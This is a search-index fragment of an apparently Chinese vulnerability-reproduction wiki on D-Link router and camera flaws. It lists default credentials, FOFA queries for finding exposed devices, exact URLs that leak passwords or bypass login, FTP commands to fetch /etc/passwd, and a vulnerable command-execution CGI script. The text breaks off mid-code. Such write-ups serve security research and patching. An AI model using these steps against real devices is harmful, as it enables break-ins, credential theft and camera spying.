body=\"D-Link\u8def\u7531\u5668\u7ba1\u7406\u9875\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/D-Link/D-Link%20AC%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E9%BB%98%E8%AE%A4%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/#\u6f0f\u6d1e\u590d\u73b0","text":"\u9ed8\u8ba4\u53e3\u4ee4\u4e3a admin:admin","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/D-Link/D-Link%20AC%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E9%BB%98%E8%AE%A4%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/#goby--poc","text":"[!NOTE] \u5df2\u4e0a\u4f20 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC \u76ee\u5f55\u4e2d D_Link_AC_Centralized_management_system__Default_weak_password.json","title":"Goby &amp; POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/D-Link/D-Link%20DCS%E7%B3%BB%E5%88%97%E7%9B%91%E6%8E%A7%20%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%20CVE-2020-25078/","text":"D-Link DCS\u7cfb\u5217\u76d1\u63a7 \u8d26\u53f7\u5bc6\u7801\u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e CVE-2020-25078 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 D-Link DCS\u7cfb\u5217\u76d1\u63a7 \u901a\u8fc7\u8bbf\u95ee\u7279\u5b9a\u7684URL\u5f97\u5230\u8d26\u53f7\u5bc6\u7801\u4fe1\u606f\uff0c\u653b\u51fb\u8005\u901a\u8fc7\u6f0f\u6d1e\u8fdb\u5165\u540e\u53f0\u53ef\u4ee5\u83b7\u53d6\u89c6\u9891\u76d1\u63a7\u9875\u9762 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] DCS-2530L DCS-2670L DCS-4603 DCS-4622 DCS-4701E DCS-4703E DCS-4705E DCS-4802E DCS-P703 FOFA \u00b6 [!NOTE] app=\"D_Link-DCS-2530L\" \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u8bbf\u95ee\u767b\u5f55\u9875\u9762\u5982\u4e0b \u51fa\u73b0\u6f0f\u6d1e\u7684 Url \u4e3a, \u5176\u4e2d\u6cc4\u9732\u4e86\u8d26\u53f7\u5bc6\u7801 http://xxx.xxx.xxx.xxx/config/getuser?index=0 \u4f7f\u7528\u6cc4\u9732\u7684\u8d26\u53f7\u5bc6\u7801\u767b\u9646\u7cfb\u7edf Goby & POC \u00b6 [!NOTE] \u5df2\u4e0a\u4f20 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC \u76ee\u5f55\u4e2d D_Link_DC_Disclosure_of_account_password_information","title":"D-Link DCS\u7cfb\u5217\u76d1\u63a7 \u8d26\u53f7\u5bc6\u7801\u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e CVE-2020-25078"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/D-Link/D-Link%20DCS%E7%B3%BB%E5%88%97%E7%9B%91%E6%8E%A7%20%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%20CVE-2020-25078/#d-link-dcs\u7cfb\u5217\u76d1\u63a7-\u8d26\u53f7\u5bc6\u7801\u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e-cve-2020-25078","text":"","title":"D-Link DCS\u7cfb\u5217\u76d1\u63a7 \u8d26\u53f7\u5bc6\u7801\u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e CVE-2020-25078"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/D-Link/D-Link%20DCS%E7%B3%BB%E5%88%97%E7%9B%91%E6%8E%A7%20%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%20CVE-2020-25078/#\u6f0f\u6d1e\u63cf\u8ff0","text":"D-Link DCS\u7cfb\u5217\u76d1\u63a7 \u901a\u8fc7\u8bbf\u95ee\u7279\u5b9a\u7684URL\u5f97\u5230\u8d26\u53f7\u5bc6\u7801\u4fe1\u606f\uff0c\u653b\u51fb\u8005\u901a\u8fc7\u6f0f\u6d1e\u8fdb\u5165\u540e\u53f0\u53ef\u4ee5\u83b7\u53d6\u89c6\u9891\u76d1\u63a7\u9875\u9762","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/D-Link/D-Link%20DCS%E7%B3%BB%E5%88%97%E7%9B%91%E6%8E%A7%20%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%20CVE-2020-25078/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] DCS-2530L DCS-2670L DCS-4603 DCS-4622 DCS-4701E DCS-4703E DCS-4705E DCS-4802E DCS-P703","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/D-Link/D-Link%20DCS%E7%B3%BB%E5%88%97%E7%9B%91%E6%8E%A7%20%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%20CVE-2020-25078/#fofa","text":"[!NOTE] app=\"D_Link-DCS-2530L\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/D-Link/D-Link%20DCS%E7%B3%BB%E5%88%97%E7%9B%91%E6%8E%A7%20%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%20CVE-2020-25078/#\u6f0f\u6d1e\u590d\u73b0","text":"\u8bbf\u95ee\u767b\u5f55\u9875\u9762\u5982\u4e0b \u51fa\u73b0\u6f0f\u6d1e\u7684 Url \u4e3a, \u5176\u4e2d\u6cc4\u9732\u4e86\u8d26\u53f7\u5bc6\u7801 http://xxx.xxx.xxx.xxx/config/getuser?index=0 \u4f7f\u7528\u6cc4\u9732\u7684\u8d26\u53f7\u5bc6\u7801\u767b\u9646\u7cfb\u7edf","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/D-Link/D-Link%20DCS%E7%B3%BB%E5%88%97%E7%9B%91%E6%8E%A7%20%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%20CVE-2020-25078/#goby--poc","text":"[!NOTE] \u5df2\u4e0a\u4f20 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC \u76ee\u5f55\u4e2d D_Link_DC_Disclosure_of_account_password_information","title":"Goby &amp; POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/D-Link/D-Link%20DSL-28881A%20FTP%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF%20CVE-2020-24578/","text":"D-Link DSL-28881A FTP\u914d\u7f6e\u9519\u8bef CVE-2020-24578 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 D-Link DSL-2888A\u8def\u7531\u5668\u5177\u6709\u6587\u4ef6\u5171\u4eab\u529f\u80fd\uff0c\u8be5\u529f\u80fd\u5141\u8bb8\u7528\u6237\u901a\u8fc7\u5c06\u5916\u90e8\u9a71\u52a8\u5668\u63d2\u5165\u8def\u7531\u5668\u6765\u4e0e\u5176\u4ed6\u7f51\u7edc\u7528\u6237\u5171\u4eab\u6587\u4ef6\u3002\u7136\u540e\u901a\u8fc7FTP\uff08\u6587\u4ef6\u4f20\u8f93\u534f\u8bae\uff09\u5171\u4eab\u3002\u4f46\u662f\uff0cFTP\u670d\u52a1\u5141\u8bb8\u7f51\u7edc\u7528\u6237\u8f6c\u4e49\u5171\u4eab\u6587\u4ef6\u5939\u4ee5\u8bbf\u95ee\u8def\u7531\u5668\u6587\u4ef6\u7cfb\u7edf\u5e76\u4e0b\u8f7d\u4f4d\u4e8e\u6839\u6587\u4ef6\u5939\u4e2d\u7684\u5176\u4ed6\u6587\u4ef6\u3002 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] D-Link DSL-2888A FOFA \u00b6 [!NOTE] body=\"DSL-2888A\" \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u524d\u63d0\u4e3a\u4f7f\u7528 D-Link DSL-28881A \u4fe1\u606f\u6cc4\u9732 CVE-2020-24577 \u83b7\u53d6FTP\u51ed\u8bc1 \u4ee5\u4e0b\u63d0\u4f9b\u4e86\u4e0b\u8f7d\u201c passwd\u201d\u7684\u793a\u4f8b\uff1a \u5728FTP\u5ba2\u6237\u7aef\u4e0a\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u4ee5\u6709\u6548\u7684\u51ed\u636e\uff08\u4eceFinding-2\u83b7\u5f97\uff09\u8fde\u63a5\u5230FTP\u670d\u52a1\u3002 \u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u5bfc\u822a\u5230\u6839\u6587\u4ef6\u5939\u3002 ftp xxx.xxx.xxx.xxx ftp> cd etc ftp> get passwd","title":"D-Link DSL-28881A FTP\u914d\u7f6e\u9519\u8bef CVE-2020-24578"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/D-Link/D-Link%20DSL-28881A%20FTP%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF%20CVE-2020-24578/#d-link-dsl-28881a-ftp\u914d\u7f6e\u9519\u8bef-cve-2020-24578","text":"","title":"D-Link DSL-28881A FTP\u914d\u7f6e\u9519\u8bef CVE-2020-24578"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/D-Link/D-Link%20DSL-28881A%20FTP%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF%20CVE-2020-24578/#\u6f0f\u6d1e\u63cf\u8ff0","text":"D-Link DSL-2888A\u8def\u7531\u5668\u5177\u6709\u6587\u4ef6\u5171\u4eab\u529f\u80fd\uff0c\u8be5\u529f\u80fd\u5141\u8bb8\u7528\u6237\u901a\u8fc7\u5c06\u5916\u90e8\u9a71\u52a8\u5668\u63d2\u5165\u8def\u7531\u5668\u6765\u4e0e\u5176\u4ed6\u7f51\u7edc\u7528\u6237\u5171\u4eab\u6587\u4ef6\u3002\u7136\u540e\u901a\u8fc7FTP\uff08\u6587\u4ef6\u4f20\u8f93\u534f\u8bae\uff09\u5171\u4eab\u3002\u4f46\u662f\uff0cFTP\u670d\u52a1\u5141\u8bb8\u7f51\u7edc\u7528\u6237\u8f6c\u4e49\u5171\u4eab\u6587\u4ef6\u5939\u4ee5\u8bbf\u95ee\u8def\u7531\u5668\u6587\u4ef6\u7cfb\u7edf\u5e76\u4e0b\u8f7d\u4f4d\u4e8e\u6839\u6587\u4ef6\u5939\u4e2d\u7684\u5176\u4ed6\u6587\u4ef6\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/D-Link/D-Link%20DSL-28881A%20FTP%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF%20CVE-2020-24578/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] D-Link DSL-2888A","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/D-Link/D-Link%20DSL-28881A%20FTP%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF%20CVE-2020-24578/#fofa","text":"[!NOTE] body=\"DSL-2888A\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/D-Link/D-Link%20DSL-28881A%20FTP%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF%20CVE-2020-24578/#\u6f0f\u6d1e\u590d\u73b0","text":"\u524d\u63d0\u4e3a\u4f7f\u7528 D-Link DSL-28881A \u4fe1\u606f\u6cc4\u9732 CVE-2020-24577 \u83b7\u53d6FTP\u51ed\u8bc1 \u4ee5\u4e0b\u63d0\u4f9b\u4e86\u4e0b\u8f7d\u201c passwd\u201d\u7684\u793a\u4f8b\uff1a \u5728FTP\u5ba2\u6237\u7aef\u4e0a\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u4ee5\u6709\u6548\u7684\u51ed\u636e\uff08\u4eceFinding-2\u83b7\u5f97\uff09\u8fde\u63a5\u5230FTP\u670d\u52a1\u3002 \u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u5bfc\u822a\u5230\u6839\u6587\u4ef6\u5939\u3002 ftp xxx.xxx.xxx.xxx ftp> cd etc ftp> get passwd","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/D-Link/D-Link%20DSL-28881A%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%20CVE-2020-24577/","text":"D-Link DSL-28881A \u4fe1\u606f\u6cc4\u9732 CVE-2020-24577 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u901a\u8fc7\u7269\u7406\u8fde\u63a5\u6216\u65e0\u7ebf\u8bbf\u95ee\u5efa\u7acb\u4e0e\u7f51\u7edc\u7684\u8fde\u63a5\u540e\uff0c\u6076\u610f\u7528\u6237\u53ef\u4ee5\u901a\u8fc7\u76f4\u63a5\u6d4f\u89c8\u4ee5\u4e0bURL\u6765\u83b7\u53d6\u7eaf\u6587\u672c\u683c\u5f0f\u7684Internet\u63d0\u4f9b\u5546\u8fde\u63a5\u7528\u6237\u540d\u548c\u5bc6\u7801\uff0c\u4ee5\u53ca\u65e0\u7ebf\u8def\u7531\u5668\u7684\u7eaf\u6587\u672c\u683c\u5f0f\u7684\u7528\u6237\u540d\u548c\u5bc6\u7801 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] D-Link DSL-2888A FOFA \u00b6 [!NOTE] body=\"DSL-2888A\" \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u767b\u5f55\u9875\u9762\u8f93\u5165\u4efb\u610f\u5bc6\u7801\u5efa\u7acb\u8fde\u63a5 \u8df3\u8f6c\u5230 http://xxx.xxx.xxx.xxx/page/login/login.html?error=fail \u663e\u793a\u5bc6\u7801\u9519\u8bef \u8bbf\u95ee\u4e0b\u5217\u4e24\u4e2a\u8fde\u63a5 http://xxx.xxx.xxx.xxx:8008/tmp/cfg/lib_cfg_cfgcmd http://xxx.xxx.xxx.xxx:8008/tmp/.nvram [!NOTE] \u8fde\u63a5Wifl\u6216\u7269\u7406\u8fde\u63a5Wifi\u624d\u80fd\u8bbf\u95ee","title":"D-Link DSL-28881A \u4fe1\u606f\u6cc4\u9732 CVE-2020-24577"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/D-Link/D-Link%20DSL-28881A%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%20CVE-2020-24577/#d-link-dsl-28881a-\u4fe1\u606f\u6cc4\u9732-cve-2020-24577","text":"","title":"D-Link DSL-28881A \u4fe1\u606f\u6cc4\u9732 CVE-2020-24577"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/D-Link/D-Link%20DSL-28881A%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%20CVE-2020-24577/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u901a\u8fc7\u7269\u7406\u8fde\u63a5\u6216\u65e0\u7ebf\u8bbf\u95ee\u5efa\u7acb\u4e0e\u7f51\u7edc\u7684\u8fde\u63a5\u540e\uff0c\u6076\u610f\u7528\u6237\u53ef\u4ee5\u901a\u8fc7\u76f4\u63a5\u6d4f\u89c8\u4ee5\u4e0bURL\u6765\u83b7\u53d6\u7eaf\u6587\u672c\u683c\u5f0f\u7684Internet\u63d0\u4f9b\u5546\u8fde\u63a5\u7528\u6237\u540d\u548c\u5bc6\u7801\uff0c\u4ee5\u53ca\u65e0\u7ebf\u8def\u7531\u5668\u7684\u7eaf\u6587\u672c\u683c\u5f0f\u7684\u7528\u6237\u540d\u548c\u5bc6\u7801","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/D-Link/D-Link%20DSL-28881A%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%20CVE-2020-24577/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] D-Link DSL-2888A","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/D-Link/D-Link%20DSL-28881A%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%20CVE-2020-24577/#fofa","text":"[!NOTE] body=\"DSL-2888A\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/D-Link/D-Link%20DSL-28881A%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%20CVE-2020-24577/#\u6f0f\u6d1e\u590d\u73b0","text":"\u767b\u5f55\u9875\u9762\u8f93\u5165\u4efb\u610f\u5bc6\u7801\u5efa\u7acb\u8fde\u63a5 \u8df3\u8f6c\u5230 http://xxx.xxx.xxx.xxx/page/login/login.html?error=fail \u663e\u793a\u5bc6\u7801\u9519\u8bef \u8bbf\u95ee\u4e0b\u5217\u4e24\u4e2a\u8fde\u63a5 http://xxx.xxx.xxx.xxx:8008/tmp/cfg/lib_cfg_cfgcmd http://xxx.xxx.xxx.xxx:8008/tmp/.nvram [!NOTE] \u8fde\u63a5Wifl\u6216\u7269\u7406\u8fde\u63a5Wifi\u624d\u80fd\u8bbf\u95ee","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/D-Link/D-Link%20DSL-28881A%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%20CVE-2020-24579/","text":"D-Link DSL-28881A \u672a\u6388\u6743\u8bbf\u95ee CVE-2020-24579 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u8def\u7531\u5668Web\u95e8\u6237\u7684\u8eab\u4efd\u9a8c\u8bc1\u4e0d\u8db3\uff0c\u65e0\u6cd5\u8bbf\u95ee\u4efb\u4f55\u7ecf\u8fc7\u8eab\u4efd\u9a8c\u8bc1\u7684\u7ba1\u7406\u9875\u9762\uff0c\u800c\u65e0\u9700\u8f93\u5165\u6b63\u786e\u7684\u5bc6\u7801\u3002\u4f4d\u4e8e\u540c\u4e00\u7f51\u7edc\u4e0a\u7684\u6076\u610f\u7528\u6237\u53ef\u4ee5\u4f7f\u7528\u65e0\u6548\u7684\u51ed\u636e\u76f4\u63a5\u6d4f\u89c8\u5230\u4efb\u4f55\u7ecf\u8fc7\u8eab\u4efd\u9a8c\u8bc1\u7684\u7ba1\u7406\u9875\u9762\u3002 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] D-Link DSL-2888A FOFA \u00b6 [!NOTE] body=\"DSL-2888A\" \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u767b\u5f55\u9875\u9762\u8f93\u5165\u4efb\u610f\u5bc6\u7801\u5efa\u7acb\u8fde\u63a5 \u8df3\u8f6c\u5230 http://xxx.xxx.xxx.xxx/page/login/login.html?error=fail \u663e\u793a\u5bc6\u7801\u9519\u8bef \u518d\u8bf7\u6c42URL http://xxx.xxx.xxx.xxx/WiFi.shtml \u672a\u6388\u6743\u8bbf\u95ee\u540e\u53f0","title":"D-Link DSL-28881A \u672a\u6388\u6743\u8bbf\u95ee CVE-2020-24579"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/D-Link/D-Link%20DSL-28881A%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%20CVE-2020-24579/#d-link-dsl-28881a-\u672a\u6388\u6743\u8bbf\u95ee-cve-2020-24579","text":"","title":"D-Link DSL-28881A \u672a\u6388\u6743\u8bbf\u95ee CVE-2020-24579"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/D-Link/D-Link%20DSL-28881A%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%20CVE-2020-24579/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u8def\u7531\u5668Web\u95e8\u6237\u7684\u8eab\u4efd\u9a8c\u8bc1\u4e0d\u8db3\uff0c\u65e0\u6cd5\u8bbf\u95ee\u4efb\u4f55\u7ecf\u8fc7\u8eab\u4efd\u9a8c\u8bc1\u7684\u7ba1\u7406\u9875\u9762\uff0c\u800c\u65e0\u9700\u8f93\u5165\u6b63\u786e\u7684\u5bc6\u7801\u3002\u4f4d\u4e8e\u540c\u4e00\u7f51\u7edc\u4e0a\u7684\u6076\u610f\u7528\u6237\u53ef\u4ee5\u4f7f\u7528\u65e0\u6548\u7684\u51ed\u636e\u76f4\u63a5\u6d4f\u89c8\u5230\u4efb\u4f55\u7ecf\u8fc7\u8eab\u4efd\u9a8c\u8bc1\u7684\u7ba1\u7406\u9875\u9762\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/D-Link/D-Link%20DSL-28881A%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%20CVE-2020-24579/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] D-Link DSL-2888A","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/D-Link/D-Link%20DSL-28881A%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%20CVE-2020-24579/#fofa","text":"[!NOTE] body=\"DSL-2888A\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/D-Link/D-Link%20DSL-28881A%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%20CVE-2020-24579/#\u6f0f\u6d1e\u590d\u73b0","text":"\u767b\u5f55\u9875\u9762\u8f93\u5165\u4efb\u610f\u5bc6\u7801\u5efa\u7acb\u8fde\u63a5 \u8df3\u8f6c\u5230 http://xxx.xxx.xxx.xxx/page/login/login.html?error=fail \u663e\u793a\u5bc6\u7801\u9519\u8bef \u518d\u8bf7\u6c42URL http://xxx.xxx.xxx.xxx/WiFi.shtml \u672a\u6388\u6743\u8bbf\u95ee\u540e\u53f0","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/D-Link/D-Link%20DSL-28881A%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%20CVE-2020-24581/","text":"D-Link DSL-28881A \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c CVE-2020-24581 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 D-Link DSL-2888A AU_2.31_V1.1.47ae55\u4e4b\u524d\u7248\u672c\u5b58\u5728\u5b89\u5168\u6f0f\u6d1e\uff0c\u8be5\u6f0f\u6d1e\u6e90\u4e8e\u5305\u542b\u4e00\u4e2aexecute cmd.cgi\u7279\u6027(\u4e0d\u80fd\u901a\u8fc7web\u7528\u6237\u754c\u9762\u8bbf\u95ee)\uff0c\u8be5\u7279\u6027\u5141\u8bb8\u7ecf\u8fc7\u8eab\u4efd\u9a8c\u8bc1\u7684\u7528\u6237\u6267\u884c\u64cd\u4f5c\u7cfb\u7edf\u547d\u4ee4\u3002 \u5728\u8be5\u7248\u672c\u56fa\u4ef6\u4e2d\u540c\u65f6\u5b58\u5728\u7740\u4e00\u4e2a\u4e0d\u5b89\u5168\u8ba4\u8bc1\u6f0f\u6d1e\uff08CVE-2020-24580\uff09\uff0c\u5728\u767b\u5f55\u754c\u9762\u8f93\u5165\u4efb\u610f\u5bc6\u7801\u5c31\u53ef\u4ee5\u6210\u529f\u8bbf\u95ee\u8def\u7531\u5668\u754c\u9762\u3002 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] D-Link DSL-2888A FOFA \u00b6 [!NOTE] body=\"DSL-2888A\" \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u767b\u5f55\u9875\u9762\u8f93\u5165\u4efb\u610f\u5bc6\u7801\u5efa\u7acb\u8fde\u63a5 \u8df3\u8f6c\u5230 http://xxx.xxx.xxx.xxx/page/login/login.html?error=fail \u663e\u793a\u5bc6\u7801\u9519\u8bef \u6f0f\u6d1e\u51fa\u73b0\u5728 execute_cmd.cgi \u6587\u4ef6\u4e2d #!/bin/sh . /usr/syscfg/api_log.sh cmd = ` echo ${ QUERY_STRING } | cut -d = -f 3 ` cmd = ` echo ${ cmd } | tr \"%20\" \" \" ` result = ` ${ cmd } ` TGP_Log ${ TGP_LOG_WARNING } \"cmd= ${ cmd } , result= ${ result } \" echo \"Content-type: text/html\" echo \"\" echo -n ${ result } \u8fd9\u91cc\u53d6\u51fa ${QUERY_STRING} \u4e2d\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\u503c\uff0c\u7136\u540e\u53bb\u9664\u7a7a\u683c\u547d\u4ee4\u6267\u884c \u5728\u8fd9\u4e2a\u8fc7\u7a0b\u4e2d\u5e76\u6ca1\u6709\u8fc7\u6ee4\uff0c\u770b\u4e00\u4e0b\u53c2\u6570\u4ece\u54ea\u6765\u7684 \u6587\u4ef6 /www/js/ajax.js get : function ( _dataType ) { var _url = this . url ; if ( _url . indexOf ( '?' ) == - 1 ) _url += '?timestamp=' + new Date (). getTime (); else _url += \"&timestamp=\" + new Date (). getTime (); if ( this . queryString . length > 0 ) _url += \"&\" + this . queryString ; this . xmlHttp . open ( 